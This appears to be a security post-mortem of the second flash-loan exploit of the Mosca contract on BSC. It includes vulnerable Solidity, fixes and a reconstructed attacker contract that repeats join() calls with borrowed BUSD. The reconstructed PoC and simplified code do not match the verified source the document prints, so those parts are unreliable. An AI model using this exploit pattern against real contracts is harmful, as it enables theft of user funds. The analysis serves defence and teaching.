# Mosca2 — Flash Loan-Based join/exit Repeat Manipulation: Second Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-17 |
| **Protocol** | Mosca (2nd Attack) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$37,600 |
| **Attacker** | [0xe763da20...](https://bscscan.com/address/0xe763da20e25103da8e6afa84b6297f87de557419) |
| **Attack Tx** | [0xf13d281d...](https://bscscan.com/tx/0xf13d281d4aa95f1aca457bd17f2531581b0ce918c90905d65934c9e67f6ae0ec) |
| **Vulnerable Contract** | [0xd8791f0c...](https://bscscan.com/address/0xd8791f0c10b831b605c5d48959eb763b266940b9) |
| **Root Cause** | Lack of fund source validation in join/exit functions allows external funds to be treated as legitimate deposits (unpatched after 1st attack) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Mosca2_exp.sol) |

---

## 1. Vulnerability Overview

The Mosca protocol suffered a second attack because the same vulnerability was left unpatched after the first attack (2025-01-10). This time, the attacker used a DODO DPP flash loan to borrow 7,000 BUSD, called the `join()` function 7 times (1,000 BUSD each), and repeated the pattern of over-withdrawing twice via `exit()`. The two attacks exploiting the same vulnerability underscore the urgency and importance of prompt security patching.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: same vulnerability left intact after the 1st attack
// (same root cause as Mosca 1st attack)
function join(uint256 amount) external {
    userBalance[msg.sender] += amount;
    totalDeposits += amount;
    IERC20(BUSD).transferFrom(msg.sender, address(this), amount);
    // No validation that funds originate from a flash loan
    // No reentrancy guard
}

function exit(address currency) external {
    uint256 amount = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Faulty totalDeposits update logic exists
    IERC20(currency).transfer(msg.sender, amount);
}

// ✅ Patched code (fix that should have been applied immediately after 1st attack)
bool private _locked;
modifier nonReentrant() {
    require(!_locked);
    _locked = true;
    _;
    _locked = false;
}
function join(uint256 amount) external nonReentrant {
    require(amount >= MIN_DEPOSIT, "Too small");
    // Record only the actually received amount
    uint256 before = IERC20(BUSD).balanceOf(address(this));
    IERC20(BUSD).transferFrom(msg.sender, address(this), amount);
    uint256 actual = IERC20(BUSD).balanceOf(address(this)) - before;
    userBalance[msg.sender] += actual;
}
```

### On-Chain Source Code

Source: **Etherscan-verified** (V2 API, chainid 56) — Mosca `0xd8791f0c10b831b605c5d48959eb763b266940b9`

```solidity
function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant{
       User storage user = users[msg.sender];
       uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;
        uint256 tax_remainder;

       uint256 baseAmount = ((amount + diff) * 1000) / 1015;
      

  
        if(enterpriseJoin) {
            
            if(refByAddr[msg.sender] == 0) {
                require(amount >= (ENTERPRISE_JOIN_FEE * 3) + (JOIN_FEE * 3), "Insufficient amount sent to join enterprise");
                if(fiat == 1){
                require(usdt.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), "Transfer failed");
                require(usdt.transferFrom(msg.sender, feeReceiver, ENTERPRISE_TAX * 3), "Transfer tax failed");
                
                
                } else {
                    require(usdc.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), "Transfer failed");
                    require(usdc.transferFrom(msg.sender, feeReceiver, ENTERPRISE_TAX * 3), "Transfer tax failed");
                }

                emit AdminFeesSent(owner, block.timestamp, ENTERPRISE_TAX * 3, fiat);

            } else {
                
                require(amount + diff >= (ENTERPRISE_JOIN_FEE * 3), "Insufficient amount to upgrade to enterprise");
                if(diff < ENTERPRISE_TAX * 3){
                    tax_remainder = (ENTERPRISE_TAX * 3) - diff;
                    adminBalance+= (ENTERPRISE_TAX * 3) - diff;
                    user.balance -= diff;
                    diff = 0;
                    

                     if(fiat == 1){
                        require(usdt.transferFrom(msg.sender, feeReceiver, tax_remainder), "Transfer failed");
                    } else {
                        require(usdc.transferFrom(msg.sender, feeReceiver, tax_remainder), "Transfer failed");
                    }

                    emit AdminFeesSent(owner, block.timestamp, tax_remainder, fiat);

                } else {
                    adminBalance+= ENTERPRISE_TAX * 3;
                    diff -= ENTERPRISE_TAX * 3;
                     user.balance -= ENTERPRISE_TAX * 3; 
                    if(diff > ENTERPRISE_JOIN_FEE * 3){
                        user.balance -= (ENTERPRISE_JOIN_FEE * 3);
                    } else {
                        user.balance -= diff;
                    }
                   

                }

                  if(amount > 0) {

                    if(fiat == 1){

                        require(usdt.transferFrom(msg.sender, address(this), amount - tax_remainder), "Transfer failed");

                    } else {

                        require(usdc.transferFrom(msg.sender, address(this), amount - tax_remainder), "Transfer failed");

                    }


                    }
                
                

              

            }
            user.enterprise = true;
        } else {

            require(amount >= JOIN_FEE, "Insufficient amount sent");


            if(fiat == 1){

                require(usdt.transferFrom(msg.sender, address(this), amount - (TAX * 3)), "Transfer failed");
                require(usdt.transferFrom(msg.sender, feeReceiver, TAX * 3), "Transfer failed");
            } else {

                 require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), "Transfer failed");
                require(usdc.transferFrom(msg.sender, feeReceiver, TAX * 3), "Transfer failed");

            }

            emit AdminFeesSent(owner, block.timestamp, TAX * 3, fiat);

            


        }
    
    
  
   user.nextDeadline = block.timestamp + 28 days;
   user.bonusDeadline = block.timestamp + 7 days;
   user.walletAddress = msg.sender;
    totalRevenue+= amount;
    user.balance += enterpriseJoin ? baseAmount - ENTERPRISE_JOIN_FEE : baseAmount - JOIN_FEE; // ❌ balance credited without any lock period

 

    if(referrers[_refCode] != address(0)){
        user.collectiveCode = _refCode;
        users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);
        users[referrers[user.collectiveCode]].inviteCount++;
        emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));
        if(users[referrers[user.collectiveCode]].inviteCount % 3 == 0){
            users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);
            emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));
        }

    }

    rewardQueue.push(msg.sender);

    if(refByAddr[msg.sender] == 0){
    generateRefCode(msg.sender);
    }

    emit Joined(msg.sender, block.timestamp, amount, fiat);

   cascade(msg.sender);

    distributeFees(msg.sender, amount);
    
 }
```

```solidity
function exitProgram() external nonReentrant {
    require(!isBlacklisted[msg.sender], "Blacklisted user");
    User storage user = users[msg.sender];

    address referrer = referrers[user.collectiveCode];
    if (referrer != address(0) && users[referrer].inviteCount > 0) {
        users[referrer].inviteCount--;
    }

    for (uint256 i = 0; i < rewardQueue.length; i++) {
        address userAddr = rewardQueue[i];
        if (userAddr == msg.sender) {

            // Remove user from reward queue and reset state
            refByAddr[userAddr] = 0;
            referrers[user.refCode] = 0x000000000000000000000000000000000000dEaD;
            user.balance = 0;
            user.enterprise = false;

            rewardQueue[i] = rewardQueue[rewardQueue.length - 1];
            rewardQueue.pop();

            emit ExitProgram(msg.sender, block.timestamp);
        }
    }
}
```

```solidity
function withdrawFiat(uint256 amount, bool isFiat, uint8 fiatToWithdraw) external nonReentrant {
    require(!isBlacklisted[msg.sender], "Blacklisted user");
     User storage user = users[msg.sender];
     uint limit = user.enterprise ? 127 * 10 ** 18 : 28 * 10 ** 18;
     uint balance; 
      uint256 baseAmount = (amount * 1000) / 1015;
     if(!isFiat) {
         balance = user.balance; 

     } else {
          balance = fiatToWithdraw == 1 ? user.balanceUSDT  : user.balanceUSDC ;
     }

      require(amount <= balance - limit, "Insufficient balance");  // ❌ limit check based on potentially inflated balance

      if (!isFiat){
        user.balance -= amount;
      }
      else {
       fiatToWithdraw == 1 ? user.balanceUSDT -= amount  : user.balanceUSDC -= amount ;  // ❌ USDT and USDC balances tracked independently
      }
       
   

    fiatToWithdraw == 1 ? usdt.transfer(msg.sender, baseAmount) : usdc.transfer(msg.sender, baseAmount);

    if(!isFiat) {
        
        distributeFees(msg.sender, amount);
         
     } else {
          distributeFeesFiat(msg.sender, amount, fiatToWithdraw);
     }
    

    emit WithdrawFiat(msg.sender, block.timestamp, amount, fiatToWithdraw);

    

}
```

**Why it is exploitable (identify the bug from the code):**

- The real `join()` function has `nonReentrant` but no deposit lock period — flash-loaned BUSD/USDC is accepted on equal footing with legitimate deposits.
- `join()` immediately credits `user.balance` via `baseAmount - JOIN_FEE` (approximately `amount * 1000/1015 - JOIN_FEE`). Calling it 7 times with flash-loaned funds inflates the internal balance.
- `withdrawFiat()` uses `user.balanceUSDT` and `user.balanceUSDC` as separate accounting slots (the `isFiat` flag branch). The attacker can drain each independently, potentially withdrawing more total value than was deposited — the USDT and USDC balances are never cross-checked against a single unified deposit total.
- The `balance - limit` check in `withdrawFiat()` uses `user.balance` (the internal inflated balance), not the actual USDT/USDC tokens in the contract.
- The identical vulnerability was unpatched from the first Mosca attack 7 days earlier (2025-01-10).

```solidity
// ✅ Fix: single unified balance, flash-loan block via same-block deposit-withdraw guard
mapping(address => uint256) public depositBlock;

function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant {
    depositBlock[msg.sender] = block.number; // ✅ record deposit block
    // ... credit balance ...
}

function withdrawFiat(uint256 amount, bool isFiat, uint8 fiatToWithdraw) external nonReentrant {
    require(block.number > depositBlock[msg.sender], "Cannot withdraw in same block as deposit"); // ✅
    // ... debit unified balance, not split by fiat type ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO DPP Flash Loan: borrow 7,000 BUSD
  │
  ├─→ [2] join() × 7 times (1,000 BUSD each)
  │         └─ Deposit using flash loan funds → no validation
  │
  ├─→ [3] Call exit(FIAT_CURRENCY_1)
  │         └─ Over-withdraw due to incorrect totalDeposits
  │
  ├─→ [4] Call exit(FIAT_CURRENCY_2)
  │         └─ Additional over-withdrawal
  │
  ├─→ [5] Repay flash loan (7,000 BUSD + fee)
  │
  └─→ [6] ~$37,600 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract Mosca2Attacker {
    address constant MOSCA2 = 0xd8791f0c10b831b605c5d48959eb763b266940b9;
    address constant DODO_DPP = /* DODO DPP pool address */;
    address constant BUSD = /* BUSD address */;

    function attack() external {
        // [1] DODO DPP Flash Loan: 7,000 BUSD
        IDODO(DODO_DPP).flashLoan(
            7_000 * 1e18, 0, address(this), ""
        );
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        IERC20(BUSD).approve(MOSCA2, type(uint256).max);

        // [2] join 7 times (1,000 BUSD each)
        for (uint256 i = 0; i < 7; i++) {
            IMosca(MOSCA2).join(1_000 * 1e18);
        }

        // [3] exit with two currencies (over-withdrawal)
        IMosca(MOSCA2).exit(FIAT_CURRENCY_1);
        IMosca(MOSCA2).exit(FIAT_CURRENCY_2);

        // [5] Repay flash loan
        IERC20(BUSD).transfer(DODO_DPP, 7_000 * 1e18 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Lack of fund source validation (external funds treated as legitimate deposits via repeated join/exit calls) |
| **CWE** | CWE-672: Operation on a Resource after Expiration or Release |
| **Attack Vector** | External (flash loan + repeated calls) |
| **DApp Category** | Deposit/Withdrawal Protocol |
| **Impact** | Protocol asset theft |

## 6. Remediation Recommendations

1. **Immediate patching**: After a security incident, review the entire codebase for the same vulnerability pattern and apply fixes immediately
2. **Pause functionality**: Implement a `pause()` mechanism to instantly halt the protocol upon attack detection
3. **Comprehensive audit**: After the 1st attack, a mandatory security audit must be conducted to scan for similar patterns across the codebase
4. **Bug bounty program**: Operate a vulnerability disclosure rewards program to incentivize discovery before exploitation

## 7. Lessons Learned

- Being hit by a second attack exploiting the same vulnerability only 7 days after the first is a stark demonstration of the critical importance of immediate patching.
- The complacent assumption that "the same attack won't happen again" is dangerous. Attackers continuously monitor for unpatched vulnerabilities.
- After an attack occurs, the protocol must be paused promptly, the entire codebase must be reviewed, and only then reopened.